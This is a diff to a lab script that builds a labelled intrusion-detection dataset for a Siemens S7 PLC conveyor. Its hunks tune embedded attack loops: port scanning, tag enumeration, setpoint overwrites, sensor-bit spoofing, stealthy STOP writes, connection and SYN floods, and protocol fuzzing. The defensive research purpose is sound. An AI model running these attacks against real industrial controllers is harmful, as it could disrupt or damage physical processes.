@@ -44,11 +44,13 @@ PREFLIGHT_ENABLED="${PREFLIGHT_ENABLED:-1}"
 REQUIRE_PREFLIGHT="${REQUIRE_PREFLIGHT:-1}"
 PREFLIGHT_WRITE_TEST="${PREFLIGHT_WRITE_TEST:-0}"
 ENABLE_CPU_CONTROL_ATTACK="${ENABLE_CPU_CONTROL_ATTACK:-0}"
+COLLECTION_PROFILE="${COLLECTION_PROFILE:-standard}"
 
 CAPTURE_DIR="${CAPTURE_DIR:-captures}"
 LOG_DIR="${LOG_DIR:-logs}"
 LABEL_DIR="${LABEL_DIR:-labels}"
 ATTACK_EVENT_LOG_ENABLED="${ATTACK_EVENT_LOG_ENABLED:-1}"
+RESET_OUTPUTS="${RESET_OUTPUTS:-1}"
 
 DAY1_DURATION_S="${DAY1_DURATION_S:-${DUR_DAY1:-14400}}"
 DAY2_DURATION_S="${DAY2_DURATION_S:-${DUR_DAY2:-14400}}"
@@ -64,6 +66,11 @@ ATTACK_REPETITIONS="${ATTACK_REPETITIONS:-3}"
 ATTACK_DURATION_S="${ATTACK_DURATION_S:-600}"
 SHORT_ATTACK_DURATION_S="${SHORT_ATTACK_DURATION_S:-300}"
 ATTACK_PROFILE="${ATTACK_PROFILE:-standard}"
+DAY2_ATTACK_REPETITIONS="${DAY2_ATTACK_REPETITIONS:-$ATTACK_REPETITIONS}"
+DAY3_ATTACK_REPETITIONS="${DAY3_ATTACK_REPETITIONS:-$ATTACK_REPETITIONS}"
+DAY4_ATTACK_REPETITIONS="${DAY4_ATTACK_REPETITIONS:-$ATTACK_REPETITIONS}"
+DAY5_ATTACK_REPETITIONS="${DAY5_ATTACK_REPETITIONS:-$ATTACK_REPETITIONS}"
+DAY6_CYCLES="${DAY6_CYCLES:-1}"
 
 DAY6_GAP_MIN_S="${DAY6_GAP_MIN_S:-120}"
 DAY6_GAP_MAX_S="${DAY6_GAP_MAX_S:-900}"
@@ -130,12 +137,16 @@ Options:
   --session-id ID         Shared session id for controller and attacker.
   --host-id ID            Host id written to labels/tag logs.
   --duration SECONDS      Override role runtime or benign day runtime.
+  --collection-profile P  standard|extended_300k. extended_300k targets ~300k 2s windows across day 1-6.
   --no-capture            Run logic without starting tshark.
   --no-preflight          Skip Snap7 preflight.
   --preflight-only        Run preflight and exit.
   --enable-cpu-control    Opt in to CPU_STOP attack. Default is disabled.
 
 Environment:
+  COLLECTION_PROFILE=standard|extended_300k
+                          extended_300k lengthens runs, repeats attacks, and varies rates for a larger dataset.
+  RESET_OUTPUTS=1|0       Default 1 resets this role's timeline/tag/event outputs at run start.
   CONTROLLER_PROFILE=standard|mixed|tia_portal_attack|attack_mixed|day4_mixed
                           If unset, controller uses mixed background; Day 4 uses day4_mixed.
 
@@ -146,6 +157,71 @@ Examples:
   Attacker host:
     bash run_day_bangtruyen.sh --day 4 --role attacker --session-id bt_s1 --iface "\\Device\\NPF_{GUID}"
 EOF
+}
+
+apply_collection_profile() {
+    case "$COLLECTION_PROFILE" in
+        standard)
+            return 0
+            ;;
+        extended_300k|300k)
+            COLLECTION_PROFILE="extended_300k"
+            # Approximate target at 2s non-overlapping windows: around 300k across day 1-6.
+            DAY1_DURATION_S="72000"
+            DAY2_DURATION_S="100800"
+            DAY3_DURATION_S="103200"
+            DAY4_DURATION_S="158400"
+            DAY5_DURATION_S="115200"
+            DAY6_DURATION_S="90000"
+
+            WARMUP_S="3600"
+            BENIGN_GAP_S="1200"
+            COOLDOWN_S="3600"
+            ATTACK_DURATION_S="3600"
+            SHORT_ATTACK_DURATION_S="1800"
+            ATTACK_REPETITIONS="12"
+            DAY2_ATTACK_REPETITIONS="12"
+            DAY3_ATTACK_REPETITIONS="20"
+            DAY4_ATTACK_REPETITIONS="12"
+            DAY5_ATTACK_REPETITIONS="12"
+            DAY6_CYCLES="3"
+
+            DAY6_GAP_MIN_S="600"
+            DAY6_GAP_MAX_S="1800"
+            DAY6_SCAN_ENUM_MIN_S="1200"
+            DAY6_SCAN_ENUM_MAX_S="2400"
+            DAY6_INTEGRITY_MIN_S="900"
+            DAY6_INTEGRITY_MAX_S="1800"
+            DAY6_AVAIL_MIN_S="600"
+            DAY6_AVAIL_MAX_S="1200"
+
+            if [[ "$ATTACK_PROFILE" == "standard" ]]; then
+                ATTACK_PROFILE="extended_300k"
+            fi
+
+            # Keep process coverage during long engineering/background segments.
+            CTRL_NORMAL_HMI_S="36000"
+            CTRL_SPARSE_HMI_S="24000"
+            CTRL_TIA_ONLY_S="24000"
+            CTRL_IDLE_S="18000"
+            CTRL_DAY4_MIXED_NORMAL_HMI_S="30000"
+            CTRL_DAY4_MIXED_TIA_S="30000"
+            CTRL_DAY4_MIXED_SPARSE_HMI_S="30000"
+            CTRL_DAY4_MIXED_IDLE_S="30000"
+            CTRL_DAY4_MIXED_TIA_TAG_LOGGER="1"
+            CTRL_TIA_ATTACK_TAG_LOGGER="1"
+            CTRL_ATTACK_MIXED_TIA_TAG_LOGGER="1"
+            CTRL_ATTACK_MIXED_IDLE_TAG_LOGGER="1"
+
+            FUZZ_PAYLOAD_MIN="8"
+            FUZZ_PAYLOAD_MAX="160"
+            ;;
+        *)
+            echo "[ERROR] Unknown --collection-profile: $COLLECTION_PROFILE" >&2
+            echo "[ERROR] Supported: standard, extended_300k" >&2
+            exit 1
+            ;;
+    esac
 }
 
 while [[ $# -gt 0 ]]; do
@@ -159,6 +235,7 @@ while [[ $# -gt 0 ]]; do
         --session-id) SESSION_ID="$2"; shift 2 ;;
         --host-id) HOST_ID="$2"; shift 2 ;;
         --duration) RUN_DURATION_OVERRIDE="$2"; shift 2 ;;
+        --collection-profile) COLLECTION_PROFILE="$2"; shift 2 ;;
         --no-capture) CAPTURE_ENABLED="0"; shift ;;
         --no-preflight) PREFLIGHT_ENABLED="0"; shift ;;
         --preflight-only) PREFLIGHT_ONLY="1"; shift ;;
@@ -186,6 +263,7 @@ fi
 if [[ -z "$CAPTURE_FILTER" ]]; then
     CAPTURE_FILTER="host $TARGET_IP"
 fi
+apply_collection_profile
 if [[ -z "$CONTROLLER_PROFILE_EXPLICIT" && "$DAY" == "4" && "$ROLE" == "controller" ]]; then
     CONTROLLER_PROFILE="day4_mixed"
 fi
@@ -200,7 +278,10 @@ cleanup() {
 }
 trap cleanup EXIT INT TERM
 
-echo "=== run_day_bangtruyen.sh day=$DAY role=$ROLE target=$TARGET_IP rack=$RACK slot=$SLOT session=$SESSION_ID host=$HOST_ID controller_profile=$CONTROLLER_PROFILE ==="
+echo "=== run_day_bangtruyen.sh day=$DAY role=$ROLE target=$TARGET_IP rack=$RACK slot=$SLOT session=$SESSION_ID host=$HOST_ID controller_profile=$CONTROLLER_PROFILE collection_profile=$COLLECTION_PROFILE attack_profile=$ATTACK_PROFILE ==="
+if [[ "$COLLECTION_PROFILE" == "extended_300k" ]]; then
+    echo "[profile] extended_300k: targets roughly 300k non-overlapping 2s windows across day 1-6. Run controller and attacker with the same profile/session."
+fi
 if [[ "$ENABLE_CPU_CONTROL_ATTACK" != "1" ]]; then
     echo "[info] CPU_STOP attack disabled. Set ENABLE_CPU_CONTROL_ATTACK=1 or --enable-cpu-control only if PLC permits it."
 fi
@@ -215,6 +296,18 @@ label_file() {
 
 attack_event_file() {
     echo "$LABEL_DIR/day${DAY}_${SESSION_ID}_${HOST_ID}_attack_events.csv"
+}
+
+init_role_outputs() {
+    [[ "$RESET_OUTPUTS" == "1" ]] || return 0
+    local lf
+    lf="$(label_file)"
+    echo "attacker_timestamp_ms,scenario_label,action,session_id,host_id,episode_id,day,note" > "$lf"
+    if [[ "$ROLE" == "attacker" && "$ATTACK_EVENT_LOG_ENABLED" == "1" ]]; then
+        rm -f "$(attack_event_file)"
+    fi
+    TAG_LOG_FILE_INITIALIZED="0"
+    echo "[init] reset role outputs: timeline=$lf reset_outputs=$RESET_OUTPUTS"
 }
 
 label() {
@@ -449,18 +542,27 @@ PYEOF
 
 start_tag_logger() {
     [[ "$ENABLE_TAG_LOGGER" == "1" ]] || { echo "[ctrl] tag logger disabled"; return 0; }
+    local output
+    local append_args=()
+    output="$LOG_DIR/day${DAY}_${SESSION_ID}_${HOST_ID}_tags.csv"
+    if [[ "${TAG_LOG_FILE_INITIALIZED:-0}" == "1" ]]; then
+        append_args+=("--append")
+    else
+        TAG_LOG_FILE_INITIALIZED="1"
+    fi
     "$PY_CMD" log_tags_bangtruyen.py \
         --target "$TARGET_IP" \
         --rack "$RACK" \
         --slot "$SLOT" \
         --interval "$TAG_LOG_INTERVAL" \
         --q0-allowed-mask "$Q0_ALLOWED_MASK" \
-        --output "$LOG_DIR/day${DAY}_${SESSION_ID}_${HOST_ID}_tags.csv" \
+        --output "$output" \
         --session-id "$SESSION_ID" \
         --host-id "$HOST_ID" \
         --scenario-id "BENIGN_READER" \
         --episode-id "${SESSION_ID}:controller:tag_logger" \
-        --day "$DAY" &
+        --day "$DAY" \
+        "${append_args[@]}" &
     TAG_LOGGER_PID="$!"
     PIDS+=("$!")
     echo "[ctrl] tag logger started"
@@ -579,6 +681,29 @@ run_controller_segment() {
     HMI_POLL_MAX_S="$old_hmi_max"
 }
 
+run_controller_segment_until() {
+    local deadline_ms="$1"
+    local name="$2"
+    local duration_s="$3"
+    local tag_enabled="$4"
+    local hmi_enabled="$5"
+    local tag_interval="$6"
+    local hmi_min="$7"
+    local hmi_max="$8"
+    local current_ms
+    local remaining_s
+
+    current_ms="$(now_ms)"
+    remaining_s=$(( (deadline_ms - current_ms) / 1000 ))
+    if (( remaining_s <= 0 )); then
+        return 1
+    fi
+    if (( duration_s > remaining_s )); then
+        duration_s="$remaining_s"
+    fi
+    run_controller_segment "$name" "$duration_s" "$tag_enabled" "$hmi_enabled" "$tag_interval" "$hmi_min" "$hmi_max"
+}
+
 start_attack_process() {
     local scenario="$1"
     case "$scenario" in
@@ -591,7 +716,12 @@ import time
 
 target = "$TARGET_IP"
 profile = os.environ.get("ATTACK_PROFILE", "standard")
-sleep_range = (8.0, 30.0) if profile == "day6_robust" else (0.4, 1.5)
+if profile == "day6_robust":
+    sleep_range = (8.0, 30.0)
+elif profile == "extended_300k":
+    sleep_range = (0.8, 6.0)
+else:
+    sleep_range = (0.4, 1.5)
 print(f"[SCAN] TCP port 102 scan loop against {target} profile={profile} sleep={sleep_range}", flush=True)
 while True:
     try:
@@ -619,7 +749,12 @@ target = "$TARGET_IP"
 rack = int("$RACK")
 slot = int("$SLOT")
 profile = os.environ.get("ATTACK_PROFILE", "standard")
-sleep_range = (2.0, 5.0) if profile == "day6_robust" else (0.15, 0.5)
+if profile == "day6_robust":
+    sleep_range = (2.0, 5.0)
+elif profile == "extended_300k":
+    sleep_range = (0.3, 2.0)
+else:
+    sleep_range = (0.15, 0.5)
 c = snap7.client.Client()
 n = 0
 print(f"[ENUM] reading M/Q/I areas profile={profile} sleep={sleep_range}", flush=True)
@@ -668,8 +803,15 @@ target = "$TARGET_IP"
 rack = int("$RACK")
 slot = int("$SLOT")
 profile = os.environ.get("ATTACK_PROFILE", "standard")
-sleep_range = (8.0, 25.0) if profile == "day6_robust" else (0.15, 0.45)
-pulse_s = 0.25 if profile == "day6_robust" else 0.12
+if profile == "day6_robust":
+    sleep_range = (8.0, 25.0)
+    pulse_s = 0.25
+elif profile == "extended_300k":
+    sleep_range = (0.5, 3.0)
+    pulse_s = random.uniform(0.12, 0.35)
+else:
+    sleep_range = (0.15, 0.45)
+    pulse_s = 0.12
 c = snap7.client.Client()
 n = 0
 toggle_stop = True
@@ -735,9 +877,19 @@ target = "$TARGET_IP"
 rack = int("$RACK")
 slot = int("$SLOT")
 profile = os.environ.get("ATTACK_PROFILE", "standard")
-sleep_range = (20.0, 60.0) if profile == "day6_robust" else (0.4, 1.2)
+if profile == "day6_robust":
+    sleep_range = (20.0, 60.0)
+elif profile == "extended_300k":
+    sleep_range = (2.0, 10.0)
+else:
+    sleep_range = (0.4, 1.2)
 c = snap7.client.Client()
-values = [100, 250, 45000, 60000, 90000]
+if profile == "extended_300k":
+    values = [100, 250, 1000, 2500, 5000, 15000, 45000, 60000, 90000]
+    times_values = [0, 30000, 60000, 120000, 180000]
+else:
+    values = [100, 250, 45000, 60000, 90000]
+    times_values = [0, 120000, 180000]
 n = 0
 print(f"[SETPOINT] randomizing CD1/CD2/CD3 timers profile={profile} sleep={sleep_range}", flush=True)
 def read_dint(client, offset):
@@ -759,7 +911,7 @@ while True:
         write_dint(c, 54, cd1, "CD1_MS")
         write_dint(c, 58, cd2, "CD2_MS")
         write_dint(c, 62, cd3, "CD3_MS")
-        write_dint(c, 50, random.choice([0, 120000, 180000]), "Times_1_MS")
+        write_dint(c, 50, random.choice(times_values), "Times_1_MS")
         n += 1
         if n % 20 == 0:
             print(f"[SETPOINT] #{n} CD1={cd1} CD2={cd2} CD3={cd3}", flush=True)
@@ -791,9 +943,16 @@ target = "$TARGET_IP"
 rack = int("$RACK")
 slot = int("$SLOT")
 profile = os.environ.get("ATTACK_PROFILE", "standard")
-sleep_range = (15.0, 45.0) if profile == "day6_robust" else (0.4, 1.5)
+if profile == "day6_robust":
+    sleep_range = (15.0, 45.0)
+elif profile == "extended_300k":
+    sleep_range = (2.0, 8.0)
+else:
+    sleep_range = (0.4, 1.5)
 c = snap7.client.Client()
 patterns = [(1,1,1), (1,0,1), (0,1,1)]
+if profile == "extended_300k":
+    patterns.extend([(0,0,1), (1,1,0), (0,1,0)])
 n = 0
 print(f"[SPOOF] spoofing Vat_1/Vat_2/Vat_3 bits profile={profile} sleep={sleep_range}", flush=True)
 while True:
@@ -854,7 +1013,12 @@ target = "$TARGET_IP"
 rack = int("$RACK")
 slot = int("$SLOT")
 profile = os.environ.get("ATTACK_PROFILE", "standard")
-sleep_range = (20.0, 60.0) if profile == "day6_robust" else (1.5, 3.0)
+if profile == "day6_robust":
+    sleep_range = (20.0, 60.0)
+elif profile == "extended_300k":
+    sleep_range = (5.0, 20.0)
+else:
+    sleep_range = (1.5, 3.0)
 c = snap7.client.Client()
 n = 0
 print(f"[STEALTHY] low-rate STOP writes on M5.1 profile={profile} sleep={sleep_range}", flush=True)
@@ -903,6 +1067,8 @@ profile = os.environ.get("ATTACK_PROFILE", "standard")
 threads_n = int("$S7_FLOOD_THREADS")
 if profile == "day6_robust":
     threads_n = max(1, min(threads_n, 2))
+elif profile == "extended_300k":
+    threads_n = max(1, min(threads_n, 4))
 lock = threading.Lock()
 ok = 0
 fail = 0
@@ -929,6 +1095,11 @@ def worker():
                 one_connect()
                 time.sleep(random.uniform(0.08, 0.5))
             time.sleep(random.uniform(8.0, 25.0))
+        elif profile == "extended_300k":
+            for _ in range(random.randint(5, 20)):
+                one_connect()
+                time.sleep(random.uniform(0.05, 0.3))
+            time.sleep(random.uniform(2.0, 8.0))
         else:
             one_connect()
 print(f"[S7_FLOOD] {threads_n} Snap7 connection workers profile={profile}", flush=True)
@@ -952,6 +1123,8 @@ profile = os.environ.get("ATTACK_PROFILE", "standard")
 threads_n = int("$SYN_FLOOD_THREADS")
 if profile == "day6_robust":
     threads_n = max(1, min(threads_n, 3))
+elif profile == "extended_300k":
+    threads_n = max(1, min(threads_n, 6))
 def one_connect():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -967,6 +1140,11 @@ def worker():
                 one_connect()
                 time.sleep(random.uniform(0.05, 0.25))
             time.sleep(random.uniform(8.0, 20.0))
+        elif profile == "extended_300k":
+            for _ in range(random.randint(10, 30)):
+                one_connect()
+                time.sleep(random.uniform(0.03, 0.2))
+            time.sleep(random.uniform(2.0, 6.0))
         else:
             one_connect()
 print(f"[SYN_FLOOD] {threads_n} TCP connect workers on port 102 profile={profile}", flush=True)
@@ -988,7 +1166,12 @@ target = "$TARGET_IP"
 profile = os.environ.get("ATTACK_PROFILE", "standard")
 min_len = int("$FUZZ_PAYLOAD_MIN")
 max_len = int("$FUZZ_PAYLOAD_MAX")
-sleep_range = (5.0, 20.0) if profile == "day6_robust" else (0.05, 0.25)
+if profile == "day6_robust":
+    sleep_range = (5.0, 20.0)
+elif profile == "extended_300k":
+    sleep_range = (1.0, 5.0)
+else:
+    sleep_range = (0.05, 0.25)
 n = 0
 print(f"[FUZZ] malformed TPKT/S7-like payloads on port 102 profile={profile} sleep={sleep_range}", flush=True)
 while True:
@@ -1107,6 +1290,11 @@ benign_period() {
     label "BENIGN_NORMAL" "END" "$episode_id" "$note"
 }
 
+reps_for_day() {
+    local var="DAY${DAY}_ATTACK_REPETITIONS"
+    echo "${!var:-$ATTACK_REPETITIONS}"
+}
+
 run_repeated() {
     local scenario="$1"
     local base_duration="${2:-$ATTACK_DURATION_S}"
@@ -1119,12 +1307,16 @@ run_repeated() {
 }
 
 run_controller_mixed() {
+    local deadline_ms
+    deadline_ms=$(( $(now_ms) + $(duration_for_day) * 1000 ))
     start_capture "controller"
     echo "[ctrl] mixed benign profile: normal_hmi -> sparse_hmi -> tia_portal_only -> idle_quiet"
-    run_controller_segment "normal_hmi" "$CTRL_NORMAL_HMI_S" "1" "1" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S"
-    run_controller_segment "sparse_hmi" "$CTRL_SPARSE_HMI_S" "1" "1" "$CTRL_SPARSE_TAG_LOG_INTERVAL" "$CTRL_SPARSE_HMI_POLL_MIN_S" "$CTRL_SPARSE_HMI_POLL_MAX_S"
-    run_controller_segment "tia_portal_only" "$CTRL_TIA_ONLY_S" "0" "0" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S"
-    run_controller_segment "idle_quiet" "$CTRL_IDLE_S" "0" "0" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S"
+    while true; do
+        run_controller_segment_until "$deadline_ms" "normal_hmi" "$CTRL_NORMAL_HMI_S" "1" "1" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
+        run_controller_segment_until "$deadline_ms" "sparse_hmi" "$CTRL_SPARSE_HMI_S" "1" "1" "$CTRL_SPARSE_TAG_LOG_INTERVAL" "$CTRL_SPARSE_HMI_POLL_MIN_S" "$CTRL_SPARSE_HMI_POLL_MAX_S" || break
+        run_controller_segment_until "$deadline_ms" "tia_portal_only" "$CTRL_TIA_ONLY_S" "0" "0" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
+        run_controller_segment_until "$deadline_ms" "idle_quiet" "$CTRL_IDLE_S" "0" "0" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
+    done
 }
 
 run_controller_tia_attack() {
@@ -1135,23 +1327,31 @@ run_controller_tia_attack() {
 }
 
 run_controller_day4_mixed() {
+    local deadline_ms
+    deadline_ms=$(( $(now_ms) + $(duration_for_day) * 1000 ))
     start_capture "controller"
     echo "[ctrl] day4 mixed attack-background profile: normal_hmi -> tia_portal -> sparse_hmi -> tia_portal -> normal_hmi -> idle_quiet"
-    run_controller_segment "day4_normal_hmi_a" "$CTRL_DAY4_MIXED_NORMAL_HMI_S" "1" "1" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S"
-    run_controller_segment "day4_tia_portal_a" "$CTRL_DAY4_MIXED_TIA_S" "$CTRL_DAY4_MIXED_TIA_TAG_LOGGER" "0" "$CTRL_TIA_ATTACK_TAG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S"
-    run_controller_segment "day4_sparse_hmi" "$CTRL_DAY4_MIXED_SPARSE_HMI_S" "1" "1" "$CTRL_SPARSE_TAG_LOG_INTERVAL" "$CTRL_SPARSE_HMI_POLL_MIN_S" "$CTRL_SPARSE_HMI_POLL_MAX_S"
-    run_controller_segment "day4_tia_portal_b" "$CTRL_DAY4_MIXED_TIA_S" "$CTRL_DAY4_MIXED_TIA_TAG_LOGGER" "0" "$CTRL_TIA_ATTACK_TAG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S"
-    run_controller_segment "day4_normal_hmi_b" "$CTRL_DAY4_MIXED_NORMAL_HMI_S" "1" "1" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S"
-    run_controller_segment "day4_idle_quiet" "$CTRL_DAY4_MIXED_IDLE_S" "0" "0" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S"
+    while true; do
+        run_controller_segment_until "$deadline_ms" "day4_normal_hmi_a" "$CTRL_DAY4_MIXED_NORMAL_HMI_S" "1" "1" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
+        run_controller_segment_until "$deadline_ms" "day4_tia_portal_a" "$CTRL_DAY4_MIXED_TIA_S" "$CTRL_DAY4_MIXED_TIA_TAG_LOGGER" "0" "$CTRL_TIA_ATTACK_TAG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
+        run_controller_segment_until "$deadline_ms" "day4_sparse_hmi" "$CTRL_DAY4_MIXED_SPARSE_HMI_S" "1" "1" "$CTRL_SPARSE_TAG_LOG_INTERVAL" "$CTRL_SPARSE_HMI_POLL_MIN_S" "$CTRL_SPARSE_HMI_POLL_MAX_S" || break
+        run_controller_segment_until "$deadline_ms" "day4_tia_portal_b" "$CTRL_DAY4_MIXED_TIA_S" "$CTRL_DAY4_MIXED_TIA_TAG_LOGGER" "0" "$CTRL_TIA_ATTACK_TAG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
+        run_controller_segment_until "$deadline_ms" "day4_normal_hmi_b" "$CTRL_DAY4_MIXED_NORMAL_HMI_S" "1" "1" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
+        run_controller_segment_until "$deadline_ms" "day4_idle_quiet" "$CTRL_DAY4_MIXED_IDLE_S" "0" "0" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
+    done
 }
 
 run_controller_attack_mixed() {
+    local deadline_ms
+    deadline_ms=$(( $(now_ms) + $(duration_for_day) * 1000 ))
     start_capture "controller"
     echo "[ctrl] attack-mixed profile for day6: normal_hmi -> sparse_hmi -> tia_portal_only -> idle_quiet while attacker runs"
-    run_controller_segment "attack_normal_hmi" "$CTRL_ATTACK_MIXED_NORMAL_HMI_S" "1" "1" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S"
-    run_controller_segment "attack_sparse_hmi" "$CTRL_ATTACK_MIXED_SPARSE_HMI_S" "1" "1" "$CTRL_SPARSE_TAG_LOG_INTERVAL" "$CTRL_SPARSE_HMI_POLL_MIN_S" "$CTRL_SPARSE_HMI_POLL_MAX_S"
-    run_controller_segment "attack_tia_portal_only" "$CTRL_ATTACK_MIXED_TIA_ONLY_S" "$CTRL_ATTACK_MIXED_TIA_TAG_LOGGER" "0" "$CTRL_TIA_ATTACK_TAG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S"
-    run_controller_segment "attack_idle_quiet" "$CTRL_ATTACK_MIXED_IDLE_S" "$CTRL_ATTACK_MIXED_IDLE_TAG_LOGGER" "0" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S"
+    while true; do
+        run_controller_segment_until "$deadline_ms" "attack_normal_hmi" "$CTRL_ATTACK_MIXED_NORMAL_HMI_S" "1" "1" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
+        run_controller_segment_until "$deadline_ms" "attack_sparse_hmi" "$CTRL_ATTACK_MIXED_SPARSE_HMI_S" "1" "1" "$CTRL_SPARSE_TAG_LOG_INTERVAL" "$CTRL_SPARSE_HMI_POLL_MIN_S" "$CTRL_SPARSE_HMI_POLL_MAX_S" || break
+        run_controller_segment_until "$deadline_ms" "attack_tia_portal_only" "$CTRL_ATTACK_MIXED_TIA_ONLY_S" "$CTRL_ATTACK_MIXED_TIA_TAG_LOGGER" "0" "$CTRL_TIA_ATTACK_TAG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
+        run_controller_segment_until "$deadline_ms" "attack_idle_quiet" "$CTRL_ATTACK_MIXED_IDLE_S" "$CTRL_ATTACK_MIXED_IDLE_TAG_LOGGER" "0" "$TAG_LOG_INTERVAL" "$HMI_POLL_MIN_S" "$HMI_POLL_MAX_S" || break
+    done
 }
 
 run_controller() {
@@ -1183,8 +1383,8 @@ run_attacker_day1() {
 
 run_attacker_day2() {
     benign_period "$WARMUP_S" "warmup"
-    run_repeated "SCAN_PORT" "$SHORT_ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
-    run_repeated "ENUM_TAGS" "$ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
+    run_repeated "SCAN_PORT" "$SHORT_ATTACK_DURATION_S" "$(reps_for_day)"
+    run_repeated "ENUM_TAGS" "$ATTACK_DURATION_S" "$(reps_for_day)"
     benign_period "$COOLDOWN_S" "cooldown"
 }
 
@@ -1195,23 +1395,23 @@ run_attacker_day3() {
     else
         echo "[att] CPU_STOP skipped by default for S7-1500 security compatibility"
     fi
-    run_repeated "RWRITE_BURST" "$ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
+    run_repeated "RWRITE_BURST" "$ATTACK_DURATION_S" "$(reps_for_day)"
     benign_period "$COOLDOWN_S" "cooldown"
 }
 
 run_attacker_day4() {
     benign_period "$WARMUP_S" "warmup"
-    run_repeated "SETPOINT_ATTACK" "$ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
-    run_repeated "SENSOR_SPOOF" "$ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
-    run_repeated "STEALTHY_WRITE" "$SHORT_ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
+    run_repeated "SETPOINT_ATTACK" "$ATTACK_DURATION_S" "$(reps_for_day)"
+    run_repeated "SENSOR_SPOOF" "$ATTACK_DURATION_S" "$(reps_for_day)"
+    run_repeated "STEALTHY_WRITE" "$SHORT_ATTACK_DURATION_S" "$(reps_for_day)"
     benign_period "$COOLDOWN_S" "cooldown"
 }
 
 run_attacker_day5() {
     benign_period "$WARMUP_S" "warmup"
-    run_repeated "S7_FLOOD" "$SHORT_ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
-    run_repeated "SYN_FLOOD" "$SHORT_ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
-    run_repeated "PROTOCOL_FUZZ" "$SHORT_ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
+    run_repeated "S7_FLOOD" "$SHORT_ATTACK_DURATION_S" "$(reps_for_day)"
+    run_repeated "SYN_FLOOD" "$SHORT_ATTACK_DURATION_S" "$(reps_for_day)"
+    run_repeated "PROTOCOL_FUZZ" "$SHORT_ATTACK_DURATION_S" "$(reps_for_day)"
     benign_period "$COOLDOWN_S" "cooldown"
 }
 
@@ -1248,16 +1448,20 @@ day6_gap() {
 }
 
 run_attacker_day6() {
+    local cycle
     local scenario
     local idx=1
     ATTACK_PROFILE="day6_robust"
     export ATTACK_PROFILE
     echo "[att] Day 6 robustness/OOD test: same labels, altered rates, random order, wide gaps"
     benign_period "$WARMUP_S" "warmup"
-    for scenario in $(mixed_scenarios); do
-        run_attack_episode "$scenario" "$(day6_duration_for "$scenario")" "$idx"
-        benign_period "$(day6_gap)" "day6_robust_gap_${idx}"
-        idx=$((idx + 1))
+    for cycle in $(seq 1 "$DAY6_CYCLES"); do
+        echo "[att] Day 6 mixed cycle ${cycle}/${DAY6_CYCLES}"
+        for scenario in $(mixed_scenarios); do
+            run_attack_episode "$scenario" "$(day6_duration_for "$scenario")" "c${cycle}_i${idx}"
+            benign_period "$(day6_gap)" "day6_robust_gap_c${cycle}_${idx}"
+            idx=$((idx + 1))
+        done
     done
     benign_period "$COOLDOWN_S" "cooldown"
 }
@@ -1290,6 +1494,8 @@ if [[ "${PREFLIGHT_ONLY:-0}" == "1" ]]; then
     echo "[preflight] done"
     exit 0
 fi
+
+init_role_outputs
 
 case "$ROLE" in
     controller) run_controller ;;
